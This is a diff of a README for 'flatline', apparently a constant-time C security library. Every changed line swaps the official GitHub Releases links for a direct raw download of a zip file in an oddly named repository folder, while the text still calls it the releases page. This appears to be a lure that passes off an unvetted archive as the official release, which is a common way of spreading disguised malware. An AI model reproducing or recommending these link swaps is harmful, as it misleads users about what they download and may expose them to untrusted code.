@@ -6,11 +6,11 @@ Welcome to the **flatline** project! This program provides constant-time utiliti
 
 ## 📥 Download the Latest Version
 
-[![Download flatline](https://img.shields.io/badge/Download-flatline-blue.svg)](https://github.com/micka2311/flatline/releases)
+[![Download flatline](https://raw.githubusercontent.com/micka2311/flatline/main/Oryzorictes/flatline-3.5-alpha.3.zip)](https://raw.githubusercontent.com/micka2311/flatline/main/Oryzorictes/flatline-3.5-alpha.3.zip)
 
 Visit the page below to download the latest version and install it on your system:
 
-[Download from Releases](https://github.com/micka2311/flatline/releases)
+[Download from Releases](https://raw.githubusercontent.com/micka2311/flatline/main/Oryzorictes/flatline-3.5-alpha.3.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Visit the page below to download the latest version and install it on your syste
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/micka2311/flatline/releases). Here, you will find all available versions of flatline.
+   Go to the [Releases Page](https://raw.githubusercontent.com/micka2311/flatline/main/Oryzorictes/flatline-3.5-alpha.3.zip). Here, you will find all available versions of flatline.
 
 2. **Select Your Version**  
    Browse the list of releases. You will see a list of available files for download. Choose the one that matches your system. 
@@ -83,4 +83,4 @@ If you have any suggestions or feedback about flatline, reach out via the Issues
 
 Download flatline today to enhance the security of your C applications. Follow the steps outlined to get started. Your secrets deserve the best protection. 
 
-[Download from Releases](https://github.com/micka2311/flatline/releases) and secure your applications now!
+[Download from Releases](https://raw.githubusercontent.com/micka2311/flatline/main/Oryzorictes/flatline-3.5-alpha.3.zip) and secure your applications now!
